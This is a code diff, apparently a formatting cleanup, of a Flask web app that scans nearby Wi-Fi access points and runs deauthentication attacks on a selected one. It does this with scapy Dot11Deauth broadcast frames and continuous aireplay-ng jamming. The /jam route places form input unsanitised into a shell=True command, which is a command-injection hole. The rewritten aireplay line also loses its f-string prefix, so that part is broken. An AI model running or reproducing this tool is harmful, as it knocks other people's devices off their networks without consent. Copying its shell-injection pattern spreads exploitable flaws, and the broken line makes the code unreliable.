@@ -2,8 +2,6 @@ import re
 import os
 import signal
 import subprocess
-from threading import Thread
-import json
 
 from flask import Flask, render_template, request, redirect, url_for
 import scapy.all
@@ -25,10 +23,12 @@ PATTERN = {
 
 command_process = None
 
+
 def scan_for_aps():
     aps = []
     print(f"[*] Scanning for APs, please wait")
-    result = subprocess.check_output(f"sudo iwlist wlan0 s", shell=True).decode()
+    result = subprocess.check_output(f"sudo iwlist wlan0 s",
+                                     shell=True).decode()
     for name, pattern in PATTERN.items():
         PATTERN[name] = re.compile(pattern)
     for line in result.split("Cell"):
@@ -37,7 +37,10 @@ def scan_for_aps():
                 ap = AP()
                 ap.mac = PATTERN["MAC Address"].findall(line)[0].strip()
                 ap.ssid = PATTERN["ESSID"].findall(line)[0].strip('"')
-                ap.power = int(PATTERN["Power"].findall(line)[0].strip().split(" ")[0]) * -1
+                ap.power = int(PATTERN["Power"]
+                               .findall(line)[0]
+                               .strip()
+                               .split(" ")[0]) * -1
                 ap.channel = PATTERN["Channel"].findall(line)[0].strip()
                 ap.id = str(int(PATTERN["ID"].findall(line)[0].strip()))
                 ap.clean()
@@ -48,13 +51,14 @@ def scan_for_aps():
     aps.sort(key=lambda x: x.ssid in ["BTWifi-X", "BTWi-fi", "Unknown SSID"])
     return aps
 
+
 def send_frames(tgt):
     packet = scapy.all.RadioTap() / \
-        scapy.all.Dot11(addr1=BROADCAST, 
-                        addr2=tgt, 
+        scapy.all.Dot11(addr1=BROADCAST,
+                        addr2=tgt,
                         addr3=tgt) / \
         scapy.all.Dot11Deauth()
-    scapy.all.sendp(packet, iface="wlan1", count=10000, 
+    scapy.all.sendp(packet, iface="wlan1", count=10000,
                     inter=0.2, verbose=1)
 
 
@@ -65,11 +69,13 @@ def jam():
         return "command already running", 400
     ap_info = request.form.get("AP_INFO")
     ap_address, channel = ap_info.split("-")
-    command = f"sudo iwconfig wlan1 channel {channel}; sudo aireplay-ng -0 0 -a {ap_address} wlan1"
-    command_process = subprocess.Popen(command, 
+    command = f"sudo iwconfig wlan1 channel {channel}; " + \
+              "sudo aireplay-ng -0 0 -a {ap_address} wlan1"
+    command_process = subprocess.Popen(command,
                                        preexec_fn=os.setsid,
                                        shell=True)
     return render_template("jamming.html")
+
 
 @app.route("/stop_jam")
 def stop_jam():
@@ -85,7 +91,6 @@ def stop_jam():
 def home():
     aps = scan_for_aps()
     return render_template("index.html", aps=aps)
-
 
 
 if __name__ == "__main__":
